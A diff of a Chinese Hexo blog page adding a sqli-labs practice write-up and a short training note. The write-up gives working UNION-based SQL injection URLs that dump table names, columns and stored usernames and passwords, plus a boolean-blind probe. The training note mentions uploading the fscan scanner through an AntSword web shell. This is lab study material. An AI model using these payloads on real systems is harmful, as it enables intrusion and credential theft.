@@ -170,6 +170,174 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/03/10/sqli-libs%E5%88%B7%E9%A2%98/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/daiwei.webp">
+      <meta itemprop="name" content="幽暗天琴">
+      <meta itemprop="description" content="每个时期即永恒, 每个瞬间即永恒">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="幽暗天琴の小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/10/sqli-libs%E5%88%B7%E9%A2%98/" class="post-title-link" itemprop="url">sqli-libs刷题</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2025-03-10 20:34:54" itemprop="dateCreated datePublished" datetime="2025-03-10T20:34:54+08:00">2025-03-10</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-03-14 18:44:48" itemprop="dateModified" datetime="2025-03-14T18:44:48+08:00">2025-03-14</time>
+              </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>1.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="sql注入基础思路"><a href="#sql注入基础思路" class="headerlink" title="sql注入基础思路"></a>sql注入基础思路</h1><h2 id="类型判断"><a href="#类型判断" class="headerlink" title="类型判断"></a>类型判断</h2><p>数字型：<code>select * from table where id =$id</code><br>字符型：<code>select * from table where id=&#39;$id&#39;</code><br>加上<code>&#39;</code>报错，再加上<code>%23</code>说明存在url注入点。</p>
+<p>如果在id处输入3-1显示的结果和id&#x3D;2是一致的，则是<strong>数字型</strong>，反之则是<strong>字符型</strong>。</p>
+<h1 id="less-1-less-2"><a href="#less-1-less-2" class="headerlink" title="less-1&amp;less-2"></a>less-1&amp;less-2</h1><h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><p><code>http://www.sqli-lab.cn/Less-1/?id=1</code>输入<code>id=1+1</code>，若返回结果与<code>id=2</code>一致，则为数字型,否则为字符型。<code>http://sqli-labs/Less-1/?id=1+1</code>并未显示，说明是字符型。<br><strong>爆表名</strong>：<code>http://localhost/Less-1/?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() %23</code><br><strong>爆列名</strong>：<code>http://localhost/Less-1/?id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&quot;users&quot; %23</code><br><strong>爆字段</strong>：<code>http://localhost/Less-1/?id=-1&#39; union select 1,password,username from information_schema.columns where table_name=&quot;users&quot; %23</code></p>
+<h2 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h2><p><strong>less-2同样验证后可知是数字型，后续做法一致。</strong></p>
+<h1 id="less-3-less-4"><a href="#less-3-less-4" class="headerlink" title="less-3&amp;less-4"></a>less-3&amp;less-4</h1><h2 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h2><p>less-3的闭合为<code>&#39;)</code>。</p>
+<h2 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h2><p>less-3的闭合为<code>&quot;)</code>。</p>
+<h1 id="less-5-less-6"><a href="#less-5-less-6" class="headerlink" title="less-5&amp;less-6"></a>less-5&amp;less-6</h1><p>less-5开始不再正常有回显了，但仍然有报错。</p>
+<h2 id="盲注中的相关函数"><a href="#盲注中的相关函数" class="headerlink" title="盲注中的相关函数:"></a>盲注中的相关函数:</h2><ul>
+<li><code>left(a,b)</code>:返回字符串a中最左边的b个字符。</li>
+<li><code>substr(a,b,c</code>)&#96;:从位置b开始截取a字符中的前c个字符。</li>
+<li><code>ascii()</code>:ascii转换,<em>a-z的ascii值：97-122</em></li>
+</ul>
+<h2 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h2><ul>
+<li>首先测试到闭合为<code>&#39;</code>闭合，开始布尔盲注：<code>http://localhost/Less-5/?id=1&#39; and length(database())=8 %23</code>得知数据库名长度为8。</li>
+<li></li>
+</ul>
+<p>参考文章：<br><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/266244">https://www.anquanke.com/post/id/266244</a><br><a target="_blank" rel="noopener" href="https://www.cnblogs.com/-qing-/p/11610385.html">https://www.cnblogs.com/-qing-/p/11610385.html</a><br><a target="_blank" rel="noopener" href="https://weread.qq.com/web/bookDetail/77d32500721a485577d8eee">从0到1：CTFer成长之路</a>（其中的sqli部分）<br><a target="_blank" rel="noopener" href="http://blog.csdn.net/qq_46432288/article/details/109295457">http://blog.csdn.net/qq_46432288/article/details/109295457</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/03/08/%E9%9B%86%E8%AE%AD1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/daiwei.webp">
+      <meta itemprop="name" content="幽暗天琴">
+      <meta itemprop="description" content="每个时期即永恒, 每个瞬间即永恒">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="幽暗天琴の小屋">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2025/03/08/%E9%9B%86%E8%AE%AD1/" class="post-title-link" itemprop="url">未命名</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2025-03-08 16:54:04 / 修改时间：17:03:21" itemprop="dateCreated datePublished" datetime="2025-03-08T16:54:04+08:00">2025-03-08</time>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>23</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="记集训1"><a href="#记集训1" class="headerlink" title="记集训1"></a>记集训1</h1><h2 id="上传fscan"><a href="#上传fscan" class="headerlink" title="上传fscan"></a>上传fscan</h2><p>蚁剑打开终端直接拖拽即可</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yatq.xyz/2025/03/06/%E6%9C%AC%E5%9C%B0%E6%A8%A1%E5%9E%8B%E6%90%AD%E5%BB%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -768,7 +936,7 @@
                   <i class="far fa-calendar-check"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2025-03-06 14:36:34" itemprop="dateModified" datetime="2025-03-06T14:36:34+08:00">2025-03-06</time>
+                <time title="修改时间：2025-03-08 14:33:21" itemprop="dateModified" datetime="2025-03-08T14:33:21+08:00">2025-03-08</time>
               </span>
 
           <br>
@@ -887,7 +1055,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -900,7 +1068,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">9</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -944,19 +1112,19 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">15k</span>
+    <span title="站点总字数">16k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">14 分钟</span>
+    <span title="站点阅读时长">15 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a> 强力驱动
   </div>
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共5.4k字</span>
+  <span class="post-count">博客全站共5.8k字</span>
 </div>
         
 
